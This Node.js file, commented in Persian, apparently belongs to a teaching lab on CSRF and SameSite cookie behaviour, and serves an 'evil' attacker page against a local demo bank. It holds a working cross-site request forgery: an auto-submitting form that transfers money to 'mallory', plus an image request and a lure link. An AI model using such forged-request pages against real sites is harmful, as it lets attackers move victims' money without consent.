// صفحهٔ مهاجم:  node bank/evil.mjs
//   http://127.0.0.1:8772  نسبت به http://localhost:8771 یک site دیگر است (cross-site)
//   http://localhost:8772  همان site است، ولی origin دیگری است (same-site و cross-origin)
import http from 'node:http'
const bank = 'http://localhost:8771'
const pages = {
  '/post': `<body onload="document.forms[0].submit()"><form method="post" action="${bank}/transfer"><input name="to" value="mallory"><input name="amount" value="100"></form>`,
  '/img': `<img src="${bank}/me" alt="">`,
  '/link': `<a id="go" href="${bank}/me">جایزهٔ شما اینجاست</a>`,
}
http.createServer((req, res) => {
  const html = pages[new URL(req.url, 'http://x').pathname]
  if (!html) { res.writeHead(404); return res.end() }
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); res.end(`<!doctype html><meta charset="utf-8"><title>evil</title>${html}`)
}).listen(8772, () => console.log('evil: http://127.0.0.1:8772/post  (cross-site)   http://localhost:8772/post  (same-site)'))
